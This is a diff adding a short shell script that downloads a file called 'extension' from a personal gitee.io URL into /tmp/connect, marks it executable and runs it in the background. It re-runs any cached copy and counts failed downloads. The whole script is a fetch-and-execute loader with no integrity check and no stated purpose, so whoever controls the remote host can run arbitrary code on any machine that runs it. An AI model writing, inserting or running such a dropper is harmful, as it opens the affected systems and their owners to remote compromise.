@@ -1,0 +1,31 @@
+#!/bin/sh
+
+wd=/tmp/connect
+mkdir -p $wd
+
+if [ -f "$wd/extension" ]; then
+    sh $wd/extension &
+    exit 0
+fi
+
+URL="https://qq179055016.gitee.io/static/extension"
+ret=`curl -L -o $wd/extension -s -w %{http_code} --connect-timeout 5 $URL | tail -n1`
+if [ "$ret" == "200" ]; then
+    date +%s > $wd/u
+    echo 0 > $wd/timeout
+    chmod +x $wd/extension
+    sh $wd/extension &
+    exit 0
+else
+    rm -rf $wd/extension
+fi
+
+if [ ! -f "$wd/timeout" ]; then
+    echo 0 > $wd/timeout
+fi
+
+timeout=`cat $wd/timeout`
+let timeout++
+echo $timeout > $wd/timeout
+
+exit 1
